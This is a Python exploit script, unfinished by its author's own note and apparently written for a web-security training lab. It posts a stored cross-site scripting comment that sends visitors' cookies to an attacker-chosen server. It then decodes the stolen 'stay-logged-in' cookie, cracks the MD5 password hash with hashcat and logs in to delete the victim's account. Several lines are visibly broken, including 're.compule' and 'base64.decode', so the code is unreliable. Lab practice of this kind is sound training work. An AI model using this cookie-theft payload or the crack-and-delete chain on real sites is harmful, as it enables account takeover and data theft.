import requests
import sys
import re
import base64
import urllib3
import subprocess
from bs4 import BeautifulSoup

# This isn't finish yet I will come back later finish it 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def hashcat_run(hashFileName) :
    # Replace these paths with your Hashcat executable and hashfile
    hashcat_executable = '/path/to/hashcat'
    hashfile = hashFileName

    # Replace with your desired Hashcat command and arguments
    hashcat_command = [
        hashcat_executable,
        '-m', '0',       # Specify hash mode (MD5)
        hashfile,        # Specify the path to the hashfile
        r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt',  # Specify your wordlist file
    ]
    
    try:
        # Run Hashcat as a subprocess
        completed_process = subprocess.run(hashcat_command, capture_output=True, text=True, check=True)

        # Check if Hashcat succeeded and capture its output
        if completed_process.returncode == 0:
            print("Hashcat succeeded!")
            cracked_password = completed_process.stdout.strip()
            print(f"Cracked password: {cracked_password}")
            return cracked_password
        else:
            print("Hashcat failed.")
            print(completed_process.stderr)
            return "random"

    except subprocess.CalledProcessError as e:
        print(f"Error running Hashcat: {e}")
    except FileNotFoundError:
        print("Hashcat executable not found. Please provide the correct path.")
    except Exception as e:
        print(f"An error occurred: {e}")


def post_comment(session, url, serverUrl) :
    
    cracket_password = "random"
    
    data = {
        "postId":8,
        "comment":f"%3Cscript%3Edocument.location%3D%27{serverUrl}%27%2Bdocument.cookie%3C%2Fscript%3E%0D%0A%0D%0A%0D%0A",
        "name":"test",
        "email":"test%40test.fr",
        "website":"http%3A%2F%2Ftest.com"
    }
    comment_url = url + "/post/comment"
    res = session.post(comment_url, data=data, proxies=proxies, verify=False)
    
    if "Thank you for your comment!" in  res.text :
        print("(+) The comment has been successfully submited!")
        log_url = url + "/log"
        r = requests.get(log_url, verify=False, proxies=proxies)
        
        if "stay-logged-in" in r.text :
            soup = BeautifulSoup(r.text, "html.parser")
            base64_hash = soup.find(re.compule(".*stay-logged-in=([^ ]+)")).group(1)
            
            username,password_hash = base64.decode(base64_hash).split(":")
            
            with open("hashfile.txt", "w", encoding="utf-8") as file :
                file.write(password_hash)
                file.close()
            
            hashfile = 'hashfile.txt'
            cracket_password = hashcat_run(hashfile)
            
    return cracket_password
            
def login_user(session, url, data, delete=False, password=any) :
    login = url + "/login"
    res = session.post(login, data=data, proxies=proxies, verify=False)
    
    if "Log out" in res.text :
        if delete :
            delete_url = url + "/my-account/delete"
            data = {"password":password}
            r = session.post(delete_url, data=data, proxies=proxies, verify=False)
            
            if r.status_code == 302 :
                print('(+) The user has been deleted successfully!')
            else :
                print("(-) Fail to resolve the lab")
        else :
            print("(+) Logged in successfully !")
            
def auth_exploit(session, url) :
    data = {"username":"wiener", "password":"peter"}
    login = url + "/login"
    login_user(session, login, data)
    
    pass

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
        serverUrl = sys.argv[2].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    session = requests.Session()
    password = post_comment(session, url, serverUrl)
    auth_exploit(session, url)